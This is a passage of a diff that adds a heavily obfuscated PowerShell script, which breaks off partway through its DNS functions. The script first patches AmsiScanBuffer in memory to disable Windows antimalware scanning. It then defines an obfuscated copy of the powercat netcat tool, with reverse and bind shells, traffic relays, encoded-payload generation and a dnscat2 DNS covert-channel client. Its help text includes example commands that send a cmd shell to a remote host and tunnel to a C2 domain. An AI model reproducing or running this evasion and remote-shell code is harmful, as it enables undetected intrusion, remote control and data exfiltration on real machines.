@@ -1,0 +1,980 @@
+
+
+
+${w`iN`32} = @"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+&('Add-T'+'ype') ${wi`N`32}
+
+${Lo`ADLIBR`A`RY} = [Win32]::"LoADLib`RA`RY"('am' + 'si' + "." + ('d'+'ll'))
+${a`ddrESS} = [Win32]::"G`et`pRO`cA`DDress"(${loA`DliB`R`ARY}, 'Am' + 'si' + 'Sc' + 'an' + 'Bu' + ('ffe'+'r'))
+${P} = 0
+[Win32]::"v`ir`TUALPRote`cT"(${Addr`Ess}, [uint32]5, 0x40, [ref]${P})
+${P`A`TCH} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::"CO`PY"(${p`At`ch}, 0, ${adDR`e`Ss}, 6)
+
+
+function powercat
+{
+  param(
+    [alias(('Cl'+'ient'))][string]${c}="",
+    [alias(('Li'+'sten'))][switch]${l}=${F`ALsE},
+    [alias(('Por'+'t'))][Parameter(posITIon=-1)][string]${p}="",
+    [alias(('Execu'+'t'+'e'))][string]${E}="",
+    [alias(('E'+'xecu'+'tePo'+'w'+'er'+'shell'))][switch]${Ep}=${fA`lsE},
+    [alias(('R'+'elay'))][string]${r}="",
+    [alias(('UD'+'P'))][switch]${u}=${Fa`L`sE},
+    [alias(('d'+'nscat2'))][string]${d`Ns}="",
+    [alias(('DNSFai'+'lur'+'eT'+'hreshold'))][int32]${dn`s`FT}=10,
+    [alias(('Time'+'ou'+'t'))][int32]${T}=60,
+    [Parameter(vAluEFROMpIpeline=${T`Rue})][alias(('In'+'put'))]${i}=${nu`Ll},
+    [ValidateSet(('Hos'+'t'), ('Byt'+'es'), ('S'+'tring'))][alias(('Outp'+'ut'+'Typ'+'e'))][string]${o}=('Ho'+'st'),
+    [alias(('Outp'+'ut'+'Fil'+'e'))][string]${Of}="",
+    [alias(('D'+'is'+'conne'+'ct'))][switch]${d}=${F`A`lSE},
+    [alias(('R'+'ep'+'eater'))][switch]${r`eP}=${f`ALse},
+    [alias(('Generate'+'P'+'ayloa'+'d'))][switch]${g}=${FA`L`se},
+    [alias(('G'+'e'+'nerateEnc'+'oded'))][switch]${g`e}=${f`Alse},
+    [alias(('Hel'+'p'))][switch]${H}=${faL`sE}
+  )
+  
+  
+  ${He`lp} = (('
+powercat - Netcat, The Powershell Version
+Github Repo'+'sitory: https://github.com/besimorhino/powercat
+
+This script attempts to implement the featu'+'res of netcat in a powers'+'hell
+script. It also contains extra features such as built-in '+'relays, execute
+p'+'owershell, and a dnscat2 client.
+
+Usage: powercat ['+'-c or -l] [-p port] [options]
+
+  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
+                  If you are using -dns, spe'+'cify the DNS Server to send quer'+'ies to.
+            
+  -l              Lis'+'ten Mode. Start a lis'+'tener on the port specified b'+'y -p.
+  
+  -p  <p'+'ort>      Port. The port to connect to, or the port '+'to liste'+'n on.
+  
+  -e  <proc> '+'  '+'   Execute. Specify the name of the process to start.
+  
+  -e'+'p             Execute Powershell. Start a pseudo powershell session. You can
+                  declare variables and execute commands, but if you try to enter
+         '+'         anoth'+'er shell (nslookup, netsh, cmd, etc.) the shell will hang.
+            '+'
+  -r  <str>  '+'     Relay. Used fo'+'r relaying network traffic between two nodes.
+     '+'             Cl'+'ient Relay Format:   -r <protocol>:<ip addr>:<port>
+             '+'    '+' Listener Relay Format: -r <protocol>:<por'+'t>
+                  DNSCat2 Relay Form'+'at:  -r dns:<dns server>:<dns port>:<domain>
+            
+  -u              UDP Mode. Send traffic over UDP.'+' Because itYsGs '+'UDP, the client
+                  must send data before the server can respond.
+      '+'      
+  -dns  <domain>  DNS Mode. Send traff'+'ic over the dnscat2 dns covert channel.
+                  Specify th'+'e dns serve'+'r to -c, the dns port to -p, and specify the 
+             '+'     domain to this option, -dns. Th'+'is is only a client.'+'
+                  Get the server here: https'+'://github.com/iagox86/dnscat2
+'+'            
+  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
+                  recieve before exiting. Set to'+' zero when receiving fil'+'es, and set high
+                  for more stability over the internet.
+            
+ '+' -t  <int>       Timeou'+'t. The number of seconds to wait before giving up on listening or
+                 '+' connecting. Default: 60
+            
+  '+'-i  <input>     Input. Provide data to be sent down the pipe as soon as'+' a connection is
+     '+'             established. Used for moving files. You can provide the pa'+'th to a fi'+'le,
+                  a byte array object, or a string. You can also pipe any of those into
+ '+'                 powercat, '+'like YsGaaaaaaYs'+'G tdV powercat -c 10.1.1.1 -p 80
+            
+  -o  <type>      Output. Specify how p'+'owercat sh'+'ould return information to the console.
+                  Val'+'id options are YsGBytesYsG, YsGStringYsG, or YsGHostYsG'+'. Default is YsGHostYsG.
+            
+  -of <path>      Output File.  Specify the path to a file to write output to.
+            
+  -d              Disconnect. powercat will disco'+'nnect after the c'+'onnection is established
+                  and the input from -i'+' is sent. Used for'+' scanning.
+            
+  -'+'rep            Repeater. powercat will co'+'ntinually restart after it is disconnected.
+                  Used for setting up a persistent server.
+                  
+  -g              Generate Payload.  Returns a scr'+'ipt as a string which will execute the
+                  powercat with the options you have'+' specified. -i, -d, and -rep will not
+                  be in'+'corporated.
+                  
+  -ge             Gener'+'at'+'e Encoded Payload. Does the same as -g, but returns a string'+' which
+                  can be executed in'+' this way: powershell -E <encoded string'+'>
+
+  -h              Print this help message.
+
+Exa'+'mples:
+
+  Listen on port 8000 and print the output to the consol'+'e.
+      powercat -l -p 8000
+  
+  Connect to 10.1.1.1 port 443, send a shell, and enable verbosit'+'y.
+      powercat -c 10.1.1.1 -p 443 -e cmd -v
+'+'  
+  Connect to the dnscat2 server on c2.exampl'+'e.com, and send dns queries
+  to '+'the dns server on 10.1.1.1 port 53.
+      powercat -c 10.1'+'.1.1'+' -p 53 -dns c2.example.com
+  
+  Send a file to 10.1.1.'+'15'+' port 8000.
+      powercat -c 10.1.1.15 -p 8'+'000 -i C:M42inputfile
+ '+' 
+  Write the data sent to the local listener on por'+'t 4444 to C:M42outfile
+      '+'powercat -l -p 4444 -of C:M42outfile
+  
+'+'  Listen on port 8000 and'+' repeatedly server a powershell shell.
+      powercat -l -p 8000 -ep -rep
+  
+  Relay traffic '+'coming in'+' on port 8000 over tcp t'+'o port 9000 on 10.1.1.1 over tcp.
+      powercat -l -p 8000 -r tcp:10.1.1.1:9000
+      
+  Rela'+'y tra'+'ffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
+  sendin'+'g queries to 10.1.1.1 port 53.
+      powercat -l -p 8000'+' -r dns:10.1.1.1:53:c2.example.com
+')."r`epLa`CE"('tdV','|')."r`Epl`Ace"(([cHAR]77+[cHAR]52+[cHAR]50),'\')."R`ep`LaCE"('YsG',[strInG][cHAR]39))
+  if(${h}){return ${H`eLP}}
+  
+  
+  
+  ${gLO`B`AL:VeR`B`oSe} = ${VE`Rbo`sE}
+  if(${O`F} -ne ''){${O} = ('By'+'tes')}
+  if(${d`NS} -eq "")
+  {
+    if(((${C} -eq "") -and (!${L})) -or ((${C} -ne "") -and ${L})){return ('You '+'mu'+'st'+' s'+'elect'+' either '+'c'+'l'+'i'+'ent mode '+'(-c) or '+'li'+'st'+'en mod'+'e ('+'-l'+').')}
+    if(${p} -eq ""){return ('P'+'lease p'+'r'+'ovi'+'de'+' a port nu'+'mb'+'er'+' to -p.')}
+  }
+  if((((${R} -ne "") -and (${E} -ne "")) -or ((${e} -ne "") -and (${E`p}))) -or  ((${r} -ne "") -and (${Ep}))){return ('You '+'c'+'an only'+' p'+'i'+'ck o'+'n'+'e of these: -'+'e,'+' -ep,'+' '+'-r')}
+  if((${i} -ne ${n`Ull}) -and ((${r} -ne "") -or (${e} -ne ""))){return ('-'+'i i'+'s n'+'ot appli'+'cable he'+'re.')}
+  if(${L})
+  {
+    ${F`A`iluRe} = ${Fa`Lse}
+    &('netst'+'at') -na | &('Se'+'lect-Strin'+'g') LISTENING | &('%') {if((${_}."t`Ost`RinG"()."sp`Lit"(":")[1]."SPL`It"(" ")[0]) -eq ${p}){&('Writ'+'e-Outpu'+'t') (('The sel'+'e'+'cted'+' p'+'ort'+' ') + ${P} + (' is al'+'re'+'ad'+'y in'+' use.')) ; ${FaI`l`URe}=${T`RUE}}}
+    if(${fAi`LURE}){break}
+  }
+  if(${R} -ne "")
+  {
+    if(${R}."S`plit"(":")."cou`Nt" -eq 2)
+    {
+      ${faiL`U`Re} = ${faL`se}
+      &('n'+'etsta'+'t') -na | &('S'+'ele'+'ct-Str'+'ing') LISTENING | &('%') {if((${_}."T`o`STrINg"()."S`PLiT"(":")[1]."S`PLiT"(" ")[0]) -eq ${R}."S`PLiT"(":")[1]){&('Write-O'+'ut'+'pu'+'t') (('The s'+'elec'+'ted p'+'o'+'rt ') + ${r}."SP`LiT"(":")[1] + (' is a'+'lr'+'eady in'+' u'+'se.')) ; ${F`AILuRe}=${t`RUe}}}
+      if(${f`AILurE}){break}
+    }
+  }
+  
+  
+  
+  function Setup_UDP
+  {
+    param(${f`Unc`SETupva`RS})
+    if(${glO`BA`L:`VERBO`SE}){${vEr`BOSe} = ${T`Rue}}
+    ${C},${L},${P},${t} = ${fu`Ncs`eT`UPvArS}
+    ${f`U`NcvARs} = @{}
+    ${F`U`Ncvars}[('E'+'nco'+'ding')] = &('New-'+'Objec'+'t') System.Text.AsciiEncoding
+    if(${l})
+    {
+      ${s`ocKetD`eSt`inAtI`O`Nbuffer} = &('New-Ob'+'je'+'c'+'t') System.Byte[] 65536
+      ${ENdp`Oi`NT} = &('N'+'ew-O'+'bject') System.Net.IPEndPoint ([System.Net.IPAddress]::"a`Ny"), ${P}
+      ${fUNc`V`Ars}[('So'+'ck'+'et')] = &('N'+'ew-Obj'+'ect') System.Net.Sockets.UDPClient ${p}
+      ${PA`C`kEtInfO} = &('N'+'ew-O'+'bject') System.Net.Sockets.IPPacketInformation
+      &('Wr'+'ite-V'+'erb'+'ose') (('Listening'+' on'+' [0.'+'0.0'+'.0] por'+'t ') + ${p} + (' [ud'+'p]'))
+      ${cONn`ec`T`HANdLe} = ${FUn`C`VA`RS}[('Socke'+'t')]."Clie`Nt"."bEGInrECEIV`E`ME`SS`Age`FR`om"(${soCkE`T`destINat`I`Onb`UFfer},0,65536,[System.Net.Sockets.SocketFlags]::"N`ONE",[ref]${eND`PO`int},${Nu`ll},${n`ULL})
+      ${s`TOPWAt`cH} = [System.Diagnostics.Stopwatch]::"Star`TneW"()
+      while(${t`RuE})
+      {
+        if(${H`OsT}."u`i"."R`AWuI"."KE`YaV`AILAble")
+        {
+          if(@(17,27) -contains (${Ho`st}."u`i"."R`AWUI"."rE`AdKEy"(('NoEc'+'ho,Includ'+'eKeyDown,I'+'nc'+'lu'+'deKeyUp'))."viR`TUAL`K`e`YCode"))
+          {
+            &('Write-Ve'+'r'+'bose') ('C'+'TRL '+'or ESC caught'+'. S'+'to'+'pp'+'i'+'ng UDP S'+'etup'+'.'+'..')
+            ${fU`NCvaRs}[('Soc'+'ke'+'t')]."Cl`OsE"()
+            ${S`TOPwAT`Ch}."S`TOP"()
+            break
+          }
+        }
+        if(${STop`W`ATCH}."eLAp`s`eD"."tO`TALs`ECOnDs" -gt ${t})
+        {
+          ${fu`NC`VArS}[('Sock'+'et')]."cl`oSe"()
+          ${S`TO`pwAtCh}."St`Op"()
+          &('Wri'+'te-Ve'+'rbos'+'e') ('Ti'+'me'+'out!') ; break
+        }
+        if(${co`NnEc`Th`AND`LE}."IsCOm`p`LEtED")
+        {
+          ${Soc`kETByTe`s`R`EAD} = ${FU`N`CVArs}[('Soc'+'ke'+'t')]."ClIe`NT"."En`DreCEIVEMe`SSA`G`eFrOm"(${COnN`ec`ThAnd`le},[ref]([System.Net.Sockets.SocketFlags]::"No`NE"),[ref]${E`N`dPO`int},[ref]${p`ACKeTi`NFo})
+          &('Writ'+'e'+'-Verbose') (('C'+'onn'+'ection f'+'rom'+' [') + ${e`ND`poINt}."aDD`RE`Ss"."ipAdD`ReSST`o`Stri`NG" + ('] po'+'rt'+' ') + ${p} + ((' [udp'+'] ac'+'cept'+'ed'+' ('+'so'+'urce p'+'o'+'rt ')) + ${e`N`dPoINt}."p`orT" + ")")
+          if(${So`Cketb`YTES`R`ead} -gt 0){break}
+          else{break}
+        }
+      }
+      ${sTo`p`WAtch}."sT`oP"()
+      ${fU`NCv`ARS}[('I'+'nit'+'ialCon'+'nect'+'ionBy'+'te'+'s')] = ${s`OCKe`Tdest`I`NAT`ioN`BuFFer}[0..([int]${SO`CkEtB`YtE`S`ReAD}-1)]
+    }
+    else
+    {
+      if(!${C}."COnta`I`NS"("."))
+      {
+        ${i`pLI`St} = @()
+        [System.Net.Dns]::"gE`ThO`STA`DDREsSes"(${C}) | &('W'+'he'+'re'+'-Object') {${_}."AD`DRes`Sf`AmIlY" -eq ('In'+'terN'+'et'+'work')} | &('%'){${Ip`l`Ist} += ${_}."IpADdreSSt`Ostr`I`NG"}
+        &('Write-'+'Verb'+'ose') (('Name'+' ') + ${c} + (' res'+'o'+'lve'+'d to a'+'ddress ') + ${i`pl`ISt}[0])
+        ${E`Nd`pOint} = &('New-O'+'b'+'ject') System.Net.IPEndPoint ([System.Net.IPAddress]::"pa`RsE"(${i`plI`st}[0])), ${P}
+      }
+      else
+      {
+        ${eND`p`o`iNT} = &('N'+'e'+'w-Object') System.Net.IPEndPoint ([System.Net.IPAddress]::"p`ARSe"(${c})), ${p}
+      }
+      ${fuNCv`A`RS}[('So'+'cket')] = &('New'+'-Obje'+'ct') System.Net.Sockets.UDPClient
+      ${Fu`NCv`ArS}[('So'+'c'+'ket')]."co`Nn`ECt"(${c},${P})
+      &('Wri'+'te-V'+'e'+'rbose') (('Sen'+'ding '+'UDP'+' traffi'+'c'+' to ') + ${C} + (' '+'port'+' ') + ${p} + ('.'+'..'))
+      &('Write-V'+'erbos'+'e') (('UD'+'P:'+' Ma'+'ke'+' '+'sure '+'to s'+'end'+' so'+'me '+'data'+' so the se'+'rver can n'+'otice you!'))
+    }
+    ${F`UnC`VaRS}[('B'+'uf'+'ferSi'+'ze')] = 65536
+    ${f`UNCVA`RS}[('End'+'Point')] = ${EN`d`pOINT}
+    ${Fun`cv`Ars}[('St'+'rea'+'mDesti'+'nationBu'+'f'+'fer')] = &('Ne'+'w-Obje'+'ct') System.Byte[] ${f`UN`CVarS}[('Bu'+'fferSi'+'ze')]
+    ${f`UnCvA`Rs}[('Strea'+'mRe'+'adOperat'+'ion')] = ${fu`Nc`VArS}[('Soc'+'ket')]."C`LieNT"."B`EGiNR`e`Ce`iveFROm"(${f`UN`CVArS}[('Stream'+'D'+'es'+'t'+'inationBuff'+'er')],0,${fUN`C`VarS}[('Buffer'+'Siz'+'e')],([System.Net.Sockets.SocketFlags]::"N`ONE"),[ref]${f`UnCV`ARs}[('EndP'+'oi'+'nt')],${NU`LL},${Nu`LL})
+    return ${f`UNCV`ARs}
+  }
+  function ReadData_UDP
+  {
+    param(${FUn`cvA`Rs})
+    ${d`ATa} = ${N`Ull}
+    if(${fU`NCV`ARs}[('Str'+'eamRe'+'a'+'d'+'Op'+'eration')]."ISCOMP`Le`TEd")
+    {
+      ${stream`Byt`E`Sr`e`AD} = ${fu`NcVA`RS}[('S'+'oc'+'ket')]."C`lieNt"."EnD`ReC`Eiv`eFRom"(${F`Un`CV`ARS}[('St'+'r'+'ea'+'mRead'+'Oper'+'ation')],[ref]${FunC`V`ARs}[('EndP'+'oint')])
+      if(${st`R`eAMbYtE`srEAd} -eq 0){break}
+      ${D`ATA} = ${fUnC`V`ArS}[('Stream'+'Destinat'+'i'+'onBuffe'+'r')][0..([int]${s`T`R`eAmb`YteSrEAD}-1)]
+      ${fU`NCva`Rs}[('Stream'+'Re'+'adOpe'+'ration')] = ${FUN`Cv`ArS}[('S'+'ocke'+'t')]."Clie`NT"."b`E`g`INRECEiVefRoM"(${FUNcv`A`Rs}[('Stre'+'amDestinat'+'io'+'n'+'Bu'+'f'+'fer')],0,${f`Un`CV`ArS}[('Buff'+'e'+'rSize')],([System.Net.Sockets.SocketFlags]::"nO`Ne"),[ref]${f`UNC`VARs}[('En'+'dPo'+'int')],${N`UlL},${N`ULL})
+    }
+    return ${D`ATa},${FuNc`V`ArS}
+  }
+  function WriteData_UDP
+  {
+    param(${Da`Ta},${fu`NCv`ArS})
+    ${f`U`NCVArs}[('Socke'+'t')]."CliE`NT"."s`enDtO"(${Da`TA},${funC`VA`Rs}[('End'+'Po'+'int')]) | &('O'+'ut-N'+'ull')
+    return ${fU`NcV`Ars}
+  }
+  function Close_UDP
+  {
+    param(${f`U`NcvA`Rs})
+    ${F`UncVA`Rs}[('So'+'cke'+'t')]."CL`ose"()
+  }
+  
+  
+  
+  function Setup_DNS
+  {
+    param(${FU`NcSET`U`p`VArs})
+    if(${G`L`ObAL:`VERBoSE}){${VER`B`OSe} = ${T`RuE}}
+    function ConvertTo-HexArray
+    {
+      param(${ST`RI`NG})
+      ${H`eX} = @()
+      ${S`Tr`INg}."to`C`hARar`RAY"() | &('%') {"{0:x}" -f [byte]${_}} | &('%') {if(${_}."LE`NGth" -eq 1){"0" + [string]${_}} else{[string]${_}}} | &('%') {${h`eX} += ${_}}
+      return ${H`EX}
+    }
+    
+    function SendPacket
+    {
+      param(${PaC`keT},${DNSs`er`VEr},${dNS`pOrT})
+      ${Comma`ND} = (('se'+'t '+"type=TXT`nserver "+"$DNSServer`nset "+"port=$DNSPort`nset "+"domain=.com`nset "+"retry=1`n") + ${P`A`cKET} + "`nexit")
+      ${r`eSULT} = (${CO`Mm`And} | &('nslook'+'up') 2>&1 | &('Out-'+'Strin'+'g'))
+      if(${R`eSU`Lt}."COnTa`I`Ns"('"')){return ([regex]::"m`ATCh"(${rE`s`ULt}."reP`La`cE"(('bio'+'='),""),(('(?'+'<=MmG'+')[^MmG]*(?'+'=M'+'mG)')."r`EplAce"(([chaR]77+[chaR]109+[chaR]71),[STRiNG][chaR]34)))."VAl`UE")}
+      else{return 1}
+    }
+    
+    function Create_SYN
+    {
+      param(${ses`sIon`id},${SEqn`UM},${t`Ag},${D`OM`Ain})
+      return (${t`AG} + ([string](&('Get-Ra'+'nd'+'om') -Maximum 9999 -Minimum 1000)) + '00' + ${SEs`sIon`Id} + ${s`eQn`UM} + ('000'+'0') + ${do`m`AIn})
+    }
+    
+    function Create_FIN
+    {
+      param(${seSSi`on`iD},${t`Ag},${D`om`Ain})
+      return (${t`Ag} + ([string](&('Get'+'-R'+'a'+'ndom') -Maximum 9999 -Minimum 1000)) + '02' + ${SesSi`O`NID} + '00' + ${do`MaIN})
+    }
+    
+    function Create_MSG
+    {
+      param(${sE`ssI`onId},${sE`qnuM},${a`c`KN`Ow`Le`DgEmeN`TNUmBER},${DA`Ta},${t`AG},${DO`m`Ain})
+      return (${t`AG} + ([string](&('G'+'e'+'t-Random') -Maximum 9999 -Minimum 1000)) + '01' + ${S`E`SSI`OniD} + ${sEQN`Um} + ${AckNoW`LeDgE`me`NtNU`mb`Er} + ${da`Ta} + ${d`om`AIn})
+    }
+    
+    function DecodePacket
+    {
+      param(${pA`CK`et})
+      
+      if(((${pA`CKET}."leng`Th")%2 -eq 1) -or (${pAc`k`et}."LEN`gTh" -eq 0)){return 1}
+      ${acKN`OWled`G`eMEN`TNuM`B`er} = (${paC`k`ET}[10..13] -join "")
+      ${se`qN`UM} = (${p`ACk`Et}[14..17] -join "")
+      [byte[]]${R`EturnIn`gda`Ta} = @()
+      
+      if(${p`ACket}."le`NGTH" -gt 18)
+      {
+        ${pacKET`E`LIM} = ${PA`CkEt}."S`UbST`RInG"(18)
+        while(${p`AC`k`etElim}."lE`NG`TH" -gt 0)
+        {
+          ${r`eTuR`NInG`DA`TA} += [byte[]][Convert]::"TOi`NT16"((${PaC`KEt`eLiM}[0..1] -join ""),16)
+          ${Pa`CKETEl`im} = ${p`A`c`keTelIM}."SUb`s`T`RInG"(2)
+        }
+      }
+      
+      return ${p`AC`kEt},${rEtuRn`In`gdAtA},${aCkNowl`EDge`MentnUm`B`Er},${S`eqnUm}
+    }
+    
+    function AcknowledgeData
+    {
+      param(${Return`ingDa`Ta},${aCkNo`wL`e`DGem`EnTnuM`BeR})
+      ${h`eX} = [string]("{0:x}" -f (([uint16]('0x' + ${ACKNOWL`eDG`Em`ENTn`UmBer}) + ${rE`Tur`Ni`NGdA`Ta}."LE`NG`TH") % 65535))
+      if(${h`Ex}."lE`NG`Th" -ne 4){${H`eX} = (("0"*(4-${H`eX}."l`en`gth")) + ${h`Ex})}
+      return ${H`eX}
+    }
+    ${f`Un`CVARs} = @{}
+    ${fU`NcV`ArS}[('DNSSer'+'ve'+'r')],${FuNC`Va`RS}[('DNS'+'P'+'ort')],${fun`CVA`Rs}[('Domai'+'n')],${fU`Nc`VA`RS}[('Fai'+'lure'+'T'+'hreshol'+'d')] = ${FUNc`sE`TUpVA`RS}
+    if(${fuN`c`VARS}[('D'+'NSPor'+'t')] -eq ''){${fUnC`VA`Rs}[('DN'+'SPort')] = '53'}
+    ${f`UnCVa`Rs}[('Ta'+'g')] = ""
+    ${F`U`NCV`ARs}[('D'+'omain')] = ("." + ${fu`NC`VarS}[('D'+'omain')])
+    
+    ${FUnc`V`Ars}[('Cre'+'ate_S'+'YN')] = ${function:Create_SYN}
+    ${fU`NCvA`Rs}[('Create'+'_M'+'SG')] = ${function:Create_MSG}
+    ${FU`NC`VArs}[('Crea'+'te_F'+'I'+'N')] = ${function:Create_FIN}
+    ${f`Unc`VARS}[('Decod'+'eP'+'a'+'cket')] = ${function:DecodePacket}
+    ${f`UNC`Vars}[('Conver'+'t'+'To-HexAr'+'r'+'ay')] = ${function:ConvertTo-HexArray}
+    ${FuNC`VA`RS}[('A'+'ckD'+'ata')] = ${function:AcknowledgeData}
+    ${fUNc`V`ArS}[('SendPa'+'cke'+'t')] = ${function:SendPacket}
+    ${F`UncvA`Rs}[('Sess'+'ion'+'Id')] = ([string](&('Ge'+'t'+'-Ra'+'ndom') -Maximum 9999 -Minimum 1000))
+    ${FuNcv`Ars}[('SeqNu'+'m')] = ([string](&('G'+'et-Rando'+'m') -Maximum 9999 -Minimum 1000))
+    ${FUNC`V`ARs}[('En'+'cod'+'ing')] = &('Ne'+'w-'+'Object') System.Text.AsciiEncoding
+    ${F`UnCVA`Rs}[('Failur'+'es')] = 0
+    
+    ${SyN`pA`CKEt} = (&('I'+'nv'+'oke-Co'+'mma'+'nd') ${fU`N`cVars}[('Cr'+'e'+'at'+'e_SYN')] -ArgumentList @(${Fu`NCV`ArS}[('Se'+'ssionI'+'d')],${F`U`NcVARS}[('Se'+'qN'+'um')],${FU`Nc`VaRs}[('T'+'ag')],${fuN`c`Va`Rs}[('Do'+'main')]))
+    ${rES`Po`Nse`PACKEt} = (&('In'+'vo'+'k'+'e-Co'+'mmand') ${F`UncV`ArS}[('Se'+'nd'+'Packet')] -ArgumentList @(${sY`N`PAckEt},${FU`NCVa`RS}[('D'+'N'+'SServe'+'r')],${fU`NC`Va`RS}[('DNS'+'Po'+'rt')]))
+    ${deCO`dE`DPAckET} = (&('I'+'nvo'+'ke'+'-C'+'ommand') ${F`UN`CvarS}[('Dec'+'o'+'dePa'+'cket')] -ArgumentList @(${rESP`o`NSe`Pack`eT}))
+    if(${DEcODEdp`ACk`eT} -eq 1){return ('Bad '+'S'+'Y'+'N response'+'. '+'Ensure you'+'r s'+'er'+'ver is s'+'et up '+'cor'+'r'+'e'+'c'+'t'+'ly.')}
+    ${r`etU`RNInGdA`TA} = ${D`EcodE`dP`AcKeT}[1]
+    if(${rE`TU`RninG`datA} -ne ""){${FunCV`A`Rs}[('In'+'p'+'utData')] = ""}
+    ${fU`NCVA`Rs}[('Ac'+'kNum')] = ${D`ec`odEdPAC`KEt}[2]
+    ${FuN`CvArS}[('Max'+'MSGDa'+'taS'+'ize')] = (244 - (&('Inv'+'oke-'+'C'+'om'+'mand') ${fu`N`CvaRS}[('Cre'+'at'+'e_MSG')] -ArgumentList @(${f`UNC`VArS}[('Sessi'+'onI'+'d')],${fu`Nc`VARs}[('S'+'eqNum')],${fU`N`cvArs}[('A'+'ck'+'Num')],"",${Fu`NC`VArS}[('T'+'ag')],${f`UncVa`Rs}[('Domai'+'n')]))."le`NgTH")
+    if(${fU`Ncv`A`RS}[('M'+'axMSGDa'+'t'+'aSize')] -le 0){return ('Dom'+'ai'+'n'+' name '+'is too long.')}
+    return ${fU`Nc`VARS}
+  }
+  function ReadData_DNS
+  {
+    param(${F`UN`cVARS})
+    if(${GloB`Al:`VEr`BOSE}){${verb`O`Se} = ${tR`Ue}}
+    
+    ${packe`T`sDATa} = @()
+    ${PAckeT`d`AtA} = ""
+    
+    if(${FuN`cVa`RS}[('I'+'npu'+'tData')] -ne ${n`Ull})
+    {
+      ${H`Ex} = (&('Invo'+'k'+'e-C'+'ommand') ${FunC`V`ARS}[('ConvertTo-'+'HexAr'+'r'+'ay')] -ArgumentList @(${fUn`c`VARS}[('Input'+'Dat'+'a')]))
+      ${sEC`T`IoN`coU`NT} = 0
+      ${pa`cKET`cOUnt} = 0
+      foreach(${Ch`Ar} in ${H`ex})
+      {
+        if(${S`Ect`ion`c`OuNT} -ge 30)
+        {
+          ${sectIONC`o`UNT} = 0
+          ${Pa`CkeT`D`AtA} += "."
+        }
+        if(${PaCK`ET`Count} -ge (${F`Unc`VArs}[('MaxMS'+'GDa'+'taSize')]))
+        {
+          ${pA`CkeT`SD`ATA} += ${pA`C`kE`TDATA}."t`RimeNd"(".")
+          ${Pa`cketCOU`NT} = 0
+          ${S`E`CT`ionCOUNt} = 0
+          ${pA`CKEt`dATA} = ""
+        }
+        ${P`AcKeTD`Ata} += ${CH`Ar}
+        ${SEC`Ti`oN`coU`NT} += 2
+        ${PACKe`T`c`ouNt} += 2
+      }
+      ${pACk`e`TD`AtA} = ${pA`C`kEtDaTa}."T`R`iMeND"(".")
+      ${PaC`KET`S`DATA} += ${P`A`ckE`Tdata}
+      ${FunCV`A`RS}[('I'+'nputDa'+'ta')] = ""
+    }
+    else
+    {
+      ${P`A`cKEtsD`ATa} = @("")
+    }
+    
+    [byte[]]${Re`TuR`N`InGDAta} = @()
+    foreach(${pAc`KEtD`ATA} in ${PACk`eT`Sd`AtA})
+    {
+      try{${mSg`PaCk`Et} = &('Invoke-Comma'+'n'+'d') ${F`UncVarS}[('Cr'+'ea'+'te_MSG')] -ArgumentList @(${f`UnCvArS}[('Ses'+'sio'+'nId')],${Fu`NCVa`Rs}[('SeqNu'+'m')],${fUN`CV`ARs}[('AckNu'+'m')],${P`ACk`ETdATA},${fu`N`cVars}[('T'+'ag')],${Fu`NcVA`Rs}[('Dom'+'ain')])}
+      catch{ &('Wr'+'ite-Verbos'+'e') ('DN'+'SC'+'A'+'T2: '+'Failed '+'to c'+'r'+'eate packet.') ; ${fUn`c`V`Ars}[('Fai'+'l'+'ures')] += 1 ; continue }
+      try{${p`AC`KET} = (&('Invok'+'e-Co'+'mm'+'an'+'d') ${FU`N`cv`ArS}[('SendPac'+'ke'+'t')] -ArgumentList @(${M`Sg`Pac`Ket},${Func`Va`Rs}[('DN'+'SServe'+'r')],${FunC`VA`Rs}[('D'+'NSPor'+'t')]))}
+      catch{ &('Wr'+'i'+'te'+'-Ve'+'rbose') ('DNSC'+'AT'+'2:'+' '+'Failed to s'+'end'+' packe'+'t.') ; ${F`UNc`VArS}[('Fai'+'lures')] += 1 ; continue }
+      try
+      {
+        ${DecodedPa`c`K`eT} = (&('Invo'+'ke-'+'Com'+'mand') ${fU`Nc`VaRS}[('Deco'+'d'+'ePac'+'ket')] -ArgumentList @(${pa`cKet}))
+        if(${DeCODE`dp`A`C`KET}."L`Ength" -ne 4){ &('Wr'+'ite-Ver'+'bose') ('DN'+'SCAT2:'+' Failure t'+'o de'+'code pa'+'cket'+', dropping'+'...'); ${fuNc`V`ARs}[('Fai'+'lu'+'res')] += 1 ; continue }
+        ${f`U`NCVa`RS}[('Ac'+'kN'+'um')] = ${D`e`c`OdED`packET}[2]
+        ${fuNc`V`A`Rs}[('Seq'+'Num')] = ${d`EcoDe`d`pAcKET}[3]
+        ${RE`T`UrnIng`dATA} += ${DEc`Od`Edpa`CkET}[1]
+      }
+      catch{ &('Write-Ver'+'b'+'ose') ('DNS'+'CAT2: '+'F'+'a'+'ilure to decod'+'e'+' pac'+'ket'+', d'+'ropping...') ; ${fU`NCVA`Rs}[('Fai'+'l'+'ures')] += 1 ; continue }
+      if(${dE`Co`DedPAc`k`ET} -eq 1){ &('Write'+'-'+'Verbose') ('DN'+'SC'+'AT2:'+' F'+'ail'+'ure to deco'+'de'+' p'+'ack'+'e'+'t, d'+'ro'+'pping'+'...') ; ${F`UNCv`A`Rs}[('Fa'+'il'+'ures')] += 1 ; continue }
+    }
+    
+    if(${FUN`cV`ARs}[('F'+'ailure'+'s')] -ge ${Fu`NCvArs}[('Fai'+'lu'+'re'+'Thr'+'eshold')]){break}
+    
+    if(${reT`URNi`Ngd`ATA} -ne @())
+    {
+      ${fU`NCvA`Rs}[('Ac'+'kNum')] = (&('Inv'+'oke-Co'+'mma'+'n'+'d') ${fUnc`V`Ars}[('A'+'ckData')] -ArgumentList @(${R`eTUr`N`iNG`data},${Fu`NCv`ARS}[('Ack'+'Num')]))
+    }
+    return ${r`eTur`N`iNgData},${F`UN`CVARS}
+  }
+  function WriteData_DNS
